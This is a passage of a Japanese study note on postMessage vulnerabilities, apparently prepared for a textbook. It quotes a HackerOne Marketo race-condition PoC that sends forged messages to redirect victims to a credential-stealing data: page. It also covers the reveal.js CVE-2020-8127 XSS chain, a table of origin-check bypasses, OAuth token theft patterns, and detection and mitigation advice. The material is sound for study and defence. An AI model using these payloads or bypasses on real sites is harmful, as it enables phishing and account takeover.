> #398054 と同じ Marketo listener を突く関連一次レポート（報告者 fransrosen、対象 www.hackerone.com、報告 2018-07-13 / 開示 2019-04-05、Weakness: Business Logic Errors）。Client-Side Race Condition による postMessage 悪用の実例として jlajara の議論と地続き。逐語で PoC を記録。

**背景**: www.hackerone.com はフォーム送信に Marketo を使用。受信側で origin チェックが無い。

**技術詳細**: フォーム送信すると www.hackerone.com 上のリスナーが該当フォームのハンドラに内容を渡す。成功なら `form.onSuccess` を実行。次のような定義がある:

```js
      form.onSuccess(function() {
        return false;
      }); 
```

`onSuccess` が `false` を返せば何も起きない。しかし `onSuccess` が存在しないか `true` を返すと、`followUpUrl` パラメータが `location.href` に送られる。この URL の中身は一切検証されない。`aliId` パラメータがあれば URL に付与する。

Marketo フローは:
1. Marketo から JS ファイルを読み込みフォーム初期化
2. www.hackerone.com にフォーム表示
3. フォーム送信。www.hackerone.com でリスナー起動
4. www.hackerone.com から Marketo へ postMessage
5. Marketo がメッセージを受け ajax で保存
6. 成功時、Marketo から www.hackerone.com へ status を postMessage。リスナーが応答を受け `onSuccess` を確認
7. `onSuccess` が false なら何もせず。存在しないか true なら `followUpUrl` に従う

**悪用**: #3 のリスナーは origin チェックが無いので、#3 と #6 の間で自分のメッセージをレースさせる。`onSuccess` を使わないフォームを見つければ任意 location へ誘導できる。www.hackerone.com 上で `mktoForm_1013` は `onSuccess` を持たない。`#contact` フラグメントで無操作でフォームが開く。

**CSP と Safari**: CSP により `javascript:` は不可。Chrome/Firefox は `data:` へのトップナビゲーションも禁止。しかし **Safari（macOS 10.13.5, Safari 11.1.1）は `data:` へのトップナビゲーションを制限しない**。これを利用:

```html
<html>
<head>
<script>
var b;
function doit() {
	setInterval(function() {
		b.postMessage('{"mktoResponse":{"for":"mktoFormMessage0","error":false,"data":{"formId":"1013","followUpUrl":"data:text/html;base64,PGhlYWQ+PGxpbmsgcmVsPXN0eWxlc2hlZXQgbWVkaWE9YWxsIGhyZWY9aHR0cHM6Ly9oYWNrZXJvbmUuY29tL2Fzc2V0cy9mcm9udGVuZC4wMjAwMjhlOTU1YTg5Zjg1YTVmYzUyMWVhYzMxMDM2OC5jc3MgLz48bGluayByZWw9c3R5bGVzaGVldCBtZWRpYT1hbGwgaHJlZj1odHRwczovL2hhY2tlcm9uZS5jb20vYXNzZXRzL3ZlbmRvci1iZmRlMjkzYTUwOTEzYTA5NWQ4Y2RlOTcwZWE1YzFlNGEzNTI0M2NjNzY3NWI2Mjg2YTJmM2Y3MDI2ZmY1ZTEwLmNzcz48L2hlYWQ+PGJvZHk+..." ,"aliId":null}}}','*');
console.log('send...')
	}, 10);
}
</script>
</head>
<body>
<a href="#" onclick="b=window.open('https://www.hackerone.com/product/response#contact','b','_blank'); doit(); return false;" target="_blank">Click me and send something</a></body>
</html>
```

> 〔補足〕上記 `followUpUrl` の base64 は www.hackerone.com のサインインページを完全再現した data: URL（原文では base64 全体が掲載されている。ここでは冒頭のみ示し、末尾は `...` で省略。省略部は原レポート参照）。`data:` ページ内の偽サインインフォームは `onsubmit` で入力メール/パスワードを窃取する。`setInterval(...,10)` で 10ms ごとに送信し正規応答にレース勝ちする。Safari は新規タブだと非アクティブ扱いで postMessage が遅くなるため、`window.open(url,'','_blank')` で完全な新規ウィンドウを開くとレース勝率が上がる。

**緩和（原文）**: `onSuccess=function(){return false}` を常に設定して `followUpUrl` が使われないようにすれば容易に緩和できる。

---

### 節K. 【Part II Case 2・一次コード】reveal.js の postMessage 任意メソッド呼び出し（CVE-2020-8127）

> jlajara Part II が Case 2 として扱う reveal.js の postMessage 脆弱性。原典は取得できなかったが、脆弱バージョン reveal.js 3.9.1 の `js/reveal.js`（GitHub `hakimel/reveal.js` tag 3.9.1）から当該ハンドラを逐語入手した。CVE-2020-8127（reveal.js < 3.9.2 の postMessage による XSS/任意 API 呼び出し）に対応する。

脆弱な `setupPostMessage`（reveal.js 3.9.1, `js/reveal.js` 1265行目付近・逐語）:

```javascript
	function setupPostMessage() {

		if( config.postMessage ) {
			window.addEventListener( 'message', function ( event ) {
				var data = event.data;

				// Make sure we're dealing with JSON
				if( typeof data === 'string' && data.charAt( 0 ) === '{' && data.charAt( data.length - 1 ) === '}' ) {
					data = JSON.parse( data );

					// Check if the requested method can be found
					if( data.method && typeof Reveal[data.method] === 'function' ) {
						var result = Reveal[data.method].apply( Reveal, data.args );

						// Dispatch a postMessage event with the returned value from
						// our method invocation for getter functions
						dispatchPostMessage( 'callback', { method: data.method, result: result } );
					}
				}
			}, false );
		}

	}
```

**脆弱点の説明**:
- `config.postMessage` が有効なとき（reveal.js のデフォルト設定で有効化されうる）、`message` リスナーは **`event.origin` を一切検証しない**。
- 受信データが `{...}` で囲まれた JSON 文字列であることだけを確認し、`data.method` が `Reveal` オブジェクト上の関数名なら、**`Reveal[data.method].apply(Reveal, data.args)` で任意の Reveal API メソッドを任意引数で呼び出せる**。
- したがって攻撃者は reveal.js ページを iframe/ポップアップに読み込み、`postMessage('{"method":"<任意メソッド>","args":[...]}', '*')` を送るだけで、被害オリジン上で Reveal の任意メソッドを起動できる。DOM を書き換える／スライド内容を注入する系のメソッドを組み合わせることで XSS に至る（これが CVE-2020-8127 の本質）。

**【補完 2026-09-18】実際の XSS 発火経路（報告 #691977、報告者 @s_p_q_r）**

> 節Kは当初「任意 Reveal メソッドを呼べる＝XSS に至る」までしか書いていなかった。補完パスで、jlajara Part II が示す**具体的な発火チェーン**を、(a) anquanke.com 再現記事（逐語）と (b) reveal.js 3.9.1 本体コード（`raw.githubusercontent.com` から逐語）で確定した。鍵は「`addKeyBinding` で未サニタイズの `description` を登録 → `showHelp()` がそれを `innerHTML` に連結する」二段構え。

チェーン:
1. まず `{"method":"addKeyBinding","args":[ <binding>, <callback> ]}` を postMessage する。`addKeyBinding(binding, callback)` は `binding.keyCode` があると `registeredKeyBindings[binding.keyCode]` に `key` と **`description` を無検証で格納**する（reveal.js 3.9.1 本体・逐語）:

```javascript
	function addKeyBinding( binding, callback ) {

		if( typeof binding === 'object' && binding.keyCode ) {
			registeredKeyBindings[binding.keyCode] = {
				callback: callback,
				key: binding.key,
				description: binding.description
			};
		}
		else {
			registeredKeyBindings[binding] = {
				callback: callback,
				key: null,
				description: null
			};
		}

	}
```

したがって `description` に `<img src=x onerror=...>` 等の HTML を仕込める（例: binding = `{keyCode:..., key:"x", description:"<悪意ある HTML/JS>"}`）。

2. 次に `{"method":"toggleHelp"}`（または `showHelp`）を postMessage して**ヘルプ画面を開かせる**。`showHelp()` は `registeredKeyBindings[binding].description` を**エスケープせず** `html` 文字列に連結し、最後に `dom.overlay.innerHTML` に代入する。ここが sink（reveal.js 3.9.1 本体・逐語、該当部抜粋）:

```javascript
	function showHelp() {
		if( config.help ) {
			...
			var html = '<p class="title">Keyboard Shortcuts</p><br/>';
			html += '<table><th>KEY</th><th>ACTION</th>';
			for( var key in keyboardShortcuts ) {
				html += '<tr><td>' + key + '</td><td>' + keyboardShortcuts[ key ] + '</td></tr>';
			}
			// Add custom key bindings that have associated descriptions
			for( var binding in registeredKeyBindings ) {
				if( registeredKeyBindings[binding].key && registeredKeyBindings[binding].description ) {
					// ↓ description を無サニタイズで innerHTML に連結（XSS sink）
					html += '<tr><td>' + registeredKeyBindings[binding].key + '</td><td>' + registeredKeyBindings[binding].description + '</td></tr>';
				}
			}
			html += '</table>';
			dom.overlay.innerHTML = [               // ← ここで innerHTML に投入
				'<header>',
					'<a class="close" href="#"><span class="icon"></span></a>',
				'</header>',
				'<div class="viewport">',
					'<div class="viewport-inner">'+ html +'</div>',
				'</div>'
			].join('');
			...
		}
	}
```

つまり `setupPostMessage`（節K冒頭）で「任意 `Reveal[method]` を呼べる」ことが、`addKeyBinding`（description を無検証格納）＋ `showHelp/toggleHelp`（description を innerHTML へ）という 2 メソッドの組み合わせで、**実際の DOM XSS に化ける**。これが CVE-2020-8127 の完全な経路。攻撃者は reveal.js ページを iframe/ポップアップに読み込み、`addKeyBinding` メッセージ → `toggleHelp` メッセージの順に送るだけでよい（いずれも origin 未検証で受理される）。

**修正版（3.9.2 以降）での対策の方向性**（〔補足（一般知識）〕。後継コードから確認できる方針。原典 jlajara の逐語ではない）:
- postMessage 経由で呼べないメソッドのブラックリストを導入。実際、後継の reveal.js には次の定数がある（GitHub コード検索で確認・逐語）:

```javascript
// Methods that may not be invoked via the postMessage API
export const POST_MESSAGE_METHOD_BLACKLIST =
	/registerPlugin|registerKeyboardShortcut|addKeyBinding|addEventListener|showPreview|previewIframe/;
```

- これにより、DOM/プラグイン/イベント登録系の危険メソッドを postMessage から呼べないようにしている。

---

### 節L. 検出（Detection）と緩和（Mitigation）のまとめ（出典: jlajara Part I の該当節 / 二次情報 + HackTricks）

**検出（原典 Part I の趣旨・WebSearch 要約 + HackTricks 逐語）**:
- postMessage 脆弱性の検出は「JS コードを読む」ことに尽きる。定義されたリスナーからデータフローを追い、脆弱な関数（sink）で終わるかを解析する必要があり、これを助ける簡単な自動ツールは無い。
- 具体的手段: `window.addEventListener('message', ...)` と `$(window).on('message', ...)` を grep、DevTools コンソールで `getEventListeners(window)`、Elements→Event Listeners、拡張 posta / postMessage-tracker。

**緩和（原典 Part I の趣旨・WebSearch 要約 + MDN の一般原則）**:
- 他サイトからメッセージを受け取ることを想定するなら、常に `origin`（必要なら `source`）で送信元の身元を検証する。
- さらに受信メッセージの **構文（スキーマ）を常に検証** する。信頼した送信元サイトにセキュリティホールがあると、それが自サイトの XSS ホールに転じうるため。
- URL を sink（`location.href`, `<a href>` 等）に流す場合は、`javascript:`/`data:` などの危険スキームを弾き、HTTP/HTTPS のみ許可する。
- origin 検証は文字列の `indexOf()`/`search()`/`match()` ではなく、厳密等価（`===`）か、正しくパースした URL の origin 比較で行う。

---

### 節M. 【補完】jlajara Part II が挙げる「参考にすべき HackerOne postMessage 報告」リスト（出典: anquanke.com 再現記事・逐語）

jlajara Part II は末尾で、postMessage 脆弱性を学ぶための実レポート集を挙げている（再現記事の「0x05 hackerone上PostMessage漏洞报告推荐」節・逐語）。教科書の「さらに読む」に転記する価値がある:

- **#168116**（Twitter: Insufficient validation on Digits bridge） https://hackerone.com/reports/168116
- **#231053**（Shopify: HTML5 structured clone algorithm を postMessage リスナーで悪用する任意 Shopify ショップの XSS。`/:id/digital_wallets/dialog`） https://hackerone.com/reports/231053
- **#381356**（HackerOne: Marketo を使った Client-Side Race Condition。`onSuccess` の無いフォーム送信で Safari の data: プロトコルへ誘導。※本ノート節J に一次全文を逐語収録済み） https://hackerone.com/reports/381356
- **#207042**（HackerOne: Marketo Forms XSS ＋ postMessage frame-jumping ＋ jQuery-JSONP で www.hackerone.com のコンタクトフォームデータを窃取） https://hackerone.com/reports/207042
- **#603764**（Upserve: `https://inventory.upserve.com/login/` の postMessage 経由 DOM XSS） https://hackerone.com/reports/603764
- **#217745**（Shopify: 悪意あるアプリの「Button Objects」経由で `$shop$.myshopify.com/admin/` に XSS） https://hackerone.com/reports/217745

〔補足〕原典 Part I/II の参考文献として MDN `Window.postMessage`、Medium「JavaScript and window.postMessage」、HackerOne hacktivity の postmessage 検索も挙げられている（再現記事・逐語）。

---

### 節N. 【補完・現代的コンテキスト】2024–2025 の二次資料が補強する運用知（出典: 各記事。jlajara 原典ではない）

> jlajara（2020）以降に整理された、実務・バグバウンティ観点の補強。**これらは jlajara の記述ではない**ことを明記し、教科書では「現代の運用ノート」として区別して使う。主出典は GitHub 上の SOTA パターン集 `guan4tou2/bug-bounty-vault-framework`（`09 - Knowledge Base/Pattern - PostMessage Exploitation.md`, last_updated 2026-06-03、`raw.githubusercontent.com` 逐語取得）。同ファイルは出典として jlajara・Intigriti・jorianwoltjer book・PortSwigger・Microsoft MSRC を挙げている。

**(1) OAuth/SSO ポップアップのトークン窃取という高価値シンク（現代で最頻出）**
- 正規のログイン/OAuth ポップアップが完了時に `window.opener.postMessage({access_token:'...'}, '*')` のように**ワイルドカードでトークンをブロードキャスト**する実装が多い。被害者が既にログイン済みなら、攻撃者ページが `window.open()` でそのポップアップを開き、自分の `message` リスナーで受けるだけでトークンを奪える（実質アカウント乗っ取り）。jlajara の「受信側の origin 欠如」だけでなく、**送信側のワイルドカード送信**も同格の危険だという視点。

**(2) 弱い origin 検証の類型（jlajara の indexOf/search に加えて）**
| 実装 | バイパス例 | 前提 |
|---|---|---|
| `e.origin.indexOf('target.com') !== -1` | `https://target.com.attacker.io` または URL に文字列を含む `https://attacker.com/?target.com` | 一致ドメイン取得 or 経路 |
| `e.origin.startsWith('https://app.target.com')` | `https://app.target.com.attacker.io` | 攻撃者ルートドメイン |
| `e.origin.endsWith('.target.com')` | `https://eviltarget.com`（ドット無し）等 | 状況依存 |
| 未エスケープ `.` の regex `^https://sub.target.com$` | `https://subXtarget.com` | 当該ドメイン取得 |
| `$` 未アンカーの regex `^https://sub\.target\.com` | `https://sub.target.com.attacker.io` | 攻撃者ルートドメイン |
| `e.origin === window.origin` | サンドボックス iframe（`srcdoc`）で両辺を `'null'` に | 被害者を誘導可 |

**(3) 検出シグナル（grep/DevTools/拡張）**
- JS バンドルを `grep -nE "addEventListener\(['\"]message|onmessage\s*="`。
- Chrome DevTools: Sources → Global Listeners で `message`、コンソールで `getEventListeners(window).message`。
- Burp **DOM Invader** / **PostMessage-Tracker** 拡張が message フローを実行時に傍受。

**(4) バグバウンティでの過大主張回避（重要）**
- 「origin 未検証」を単体で出すと **N/A / Informative クローズ**されやすい。**攻撃者ページ→被害者が開く→sink 発火（alert/ネットワークログ/トークン文字列）を観測する end-to-end PoC** が要る。
- sink が `console.log` や UI 状態変更のみなら影響を過大に書かない。トークン漏洩は「実際にセッションへ交換できた」ところまで確認してから ATO と主張する。
- 概算重大度: postMessage→`eval`/`innerHTML` sink＋origin 検証欠如＋end-to-end XSS PoC ≈ P2 High／OAuth トークンのワイルドカード配布を実捕捉 ≈ P1–P2。

出典URL（節Nの二次資料。到達可否は「読者が自分で開くべき資料」節に記載）:
- guan4tou2/bug-bounty-vault-framework（GitHub、逐語取得済み）
- https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities
- https://book.jorianwoltjer.com/web/client-side/cross-site-scripting-xss/postmessage-exploitation
- https://portswigger.net/web-security/dom-based/controlling-the-web-message-source
- https://www.microsoft.com/en-us/msrc/blog/2025/08/postmessaged-and-compromised

---

## 読者が自分で開くべき資料（原典が egress ブロックで取得できなかったため）

> 以下 2 本（jlajara Part I / Part II）は本タスクの環境では `jlajara.gitlab.io` ドメイン全体が組織 egress ポリシーで 403 拒否となり、WebFetch・curl・Wayback Machine・r.jina.ai いずれでも取得できなかった。読者は自身のブラウザ/環境で直接アクセスし、以下の「読みどころ」を確認してほしい。教科書にはこの読みどころリストをそのまま転記すること。

### 1) PostMessage Vulnerabilities. Part I — https://jlajara.gitlab.io/Dom_XSS_PostMessage
読みどころ:
1. **postMessage の定義**（親↔ポップアップ、親↔iframe のクロスオリジン通信 API という位置づけ）と、誤用が情報漏洩／XSS になる理由。
2. **1.html / 2.html / 3.html の逐語デモコード**（本ノート節Bは二次情報からの再構成であり、原典の変数名・行構成は原典で確認する価値が高い）。特に `2.html` が origin 未検証で受信データを `<a href>`（「Go back」リンク）に代入する箇所と、`3.html` が iframe + `postMessage({url:"javascript:prompt(1)"})` で発火させる箇所。
3. **検出手法の節**（`window.addEventListener`/`$(window).on` の grep、`getEventListeners(window)`、DevTools Event Listeners）。
4. **緩和の節**（origin/source 検証と受信メッセージの構文検証）。
5. 記事末尾の **Part II への導線**（実戦ケースへ続く旨）。

### 2) PostMessage Vulnerabilities. Part II — https://jlajara.gitlab.io/Dom_XSS_PostMessage_2
読みどころ:
1. **HackerOne #398054（Marketo forms2.js）ケースの jlajara 独自解説**（本ノート節Iに一次レポート全文を逐語収録済みだが、jlajara がどの行を「sink」「origin 欠如」と指摘し、どう再現手順を組み立てたかの解説部分）。
2. **reveal.js（CVE-2020-8127）ケースの jlajara 独自解説**（本ノート節Kに 3.9.1 の脆弱ハンドラを逐語収録済み。jlajara が具体的にどの `Reveal[method]` を呼んで XSS に到達させたかの exploit 手順を原典で確認）。
3. **origin チェックのバイパス実例**（`indexOf`/`search` などの弱い実装をどう破るか。本ノート節Dに HackTricks 逐語で同等内容あり）。
4. **CSP による制限とその回避／フィッシング亜種**の議論（`javascript:` が CSP で止まる話、Safari の `data:` 挙動など）。
5. jlajara がまとめた **チェックリスト/緩和策** の最終節。

### 3) 原典が読めないときの代替資料（補完パスで到達可否を実測）
| 資料 | 本タスク環境での到達可否 | 読者向けメモ |
|---|---|---|
| **anquanke.com「通过HackerOne漏洞报告学习PostMessage漏洞实战场景中的利用与绕过」** https://www.anquanke.com/post/id/219088 | ドメイン直アクセスは未試行（egress 不明）だが、**GitHub mirror `wonderkun/crawler` 経由の raw で全文取得できた**。 | **jlajara Part I/II の最も忠実な再現（中国語）**。Part I の 1/2/3.html 逐語、Part II の #398054・#499030・reveal.js #691977 を解説。原典が読めない読者の**第一代替**。本ノート節B'・節I'・節K・節M はこれに依拠。 |
| HackTricks「PostMessage Vulnerabilities」 https://hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html | 直アクセス 403。`raw.githubusercontent.com/HackTricks-wiki/hacktricks/.../README.md` 経由でのみ取得可。 | jlajara Part II を明示引用。origin バイパス技法の網羅カタログとして最良。本ノート節C–H に依拠。 |
| Intigriti「Exploiting postMessage vulnerabilities」 https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities | **egress ブロック（403 connect_rejected）で取得不能**。 | 読みどころ: 実務的なリスナー列挙〜PoC 化の手順、DOM Invader の使い方。読者が自分の環境で開いて手順を追う価値大。 |
| jorianwoltjer book「postMessage exploitation」 https://book.jorianwoltjer.com/web/client-side/cross-site-scripting-xss/postmessage-exploitation | **egress ブロックで取得不能**。 | 読みどころ: origin バイパスの体系整理、sandbox/null-origin の実演、最新ブラウザ挙動。 |
| PortSwigger Web Security Academy「Controlling the web message source」 https://portswigger.net/web-security/dom-based/controlling-the-web-message-source | **egress ブロックで取得不能**。 | 読みどころ: 無料の対話式ラボで `addEventListener('message')`→`innerHTML`/`location` sink を自分の手で悪用体験。DOM-based の基礎を固めるのに最適。 |
| Microsoft MSRC「postMessage’d and Compromised」(2025-08) https://www.microsoft.com/en-us/msrc/blog/2025/08/postmessaged-and-compromised | プロキシ到達するが **403（ボット保護）で本文取得不能**。 | 読みどころ: 2025 年時点の実サービスでの postMessage 悪用事例と、ベンダ側の緩和の最新動向。 |

〔補足〕上記のうち **anquanke.com（GitHub mirror 経由）と HackTricks（GitHub raw 経由）は本タスクで逐語入手でき、本ノートに反映済み**。Intigriti / jorianwoltjer / PortSwigger は egress ブロック、Microsoft MSRC はボット保護で、いずれも読者自身の通常ブラウザからは問題なく読めるはずなので、上表の「読みどころ」を目的に各自でアクセスすること。

---

## 付録: 主要 source/sink・チェック関数の一覧（本ノート内容の索引）

| 区分 | 具体例 | 備考 |
|---|---|---|
| 受信登録（source の入口） | `window.addEventListener('message', h)` / `$(window).on('message', h)`（JQuery） | ここを grep して起点にする |
| 受信データ | `event.data`, `e.originalEvent.data`（JQuery） | JSON 文字列のことが多い |
| 危険な sink | `location.href = x`, `location = x`, `<a>.href = x`, `element.innerHTML = x`, `eval`, `document.write`, `Function`, `setTimeout('文字列')` | 節I は `location.href`、節B は `<a href>` |
| 危険な動的呼び出し | `Reveal[data.method].apply(Reveal, data.args)` | 節K, CVE-2020-8127 |
| innerHTML sink（reveal.js の実発火点） | `dom.overlay.innerHTML = ...+ registeredKeyBindings[binding].description +...`（`showHelp`） | 節K。`addKeyBinding` で description を無検証格納→ここで発火 |
| 弱い origin チェック（方向ミス） | `0 === i.indexOf(event.origin)`（信頼文字列が受信 origin を接頭辞に含むか） | 節I'。`.ma` ドメインで前方一致バイパス（#499030） |
| 弱い origin チェック（バイパス可） | `origin.indexOf(prefix)`, `origin.search(str)`, `origin.match(re)` | 節D。`.` がワイルドカードになる罠 |
| 誤用しがちな認可 | `event.isTrusted` を送信元認可に使う | 節D。無効な使い方 |
| 正しい検証 | `event.origin === 'https://trusted'`（厳密等価）＋ `event.source` 確認＋ペイロードのスキーマ/スキーム検証 | 節L |
| null origin バイパス | `sandbox="allow-scripts allow-popups"` の iframe→popup で `null==null` | 節E |
| e.source バイパス | 送信 iframe を即削除して `e.source=null` | 節F |
| フレーミング回避 | `X-Frame-Options`/CSP `frame-ancestors` があれば `window.open()`+`postMessage` | 節G |

---

（記録終わり。原典 Part I / Part II（`jlajara.gitlab.io`）の**英語原文そのもの**は egress ブロックにより未取得のまま。ただし**補完パス 2026-09-18** で、jlajara Part I/II を忠実に再現した anquanke.com 記事（GitHub mirror 経由・逐語）を入手し、**Part I の 1/2/3.html 逐語コード（節B'）、Part II の #499030 バイパス（節I'）、reveal.js の実 XSS 経路（節K 増補）、jlajara の推奨レポート集（節M）**を確定・追加した。加えて一次ソース（H1 #398054・#381356、reveal.js 3.9.1）と HackTricks を逐語掲載、現代的運用知（節N）を二次資料として区別のうえ補った。**anquanke.com は jlajara 本人の記述ではなく中国語再現記事**である点、および二次資料と原典の別は各所で明示済み。捏造なし。）
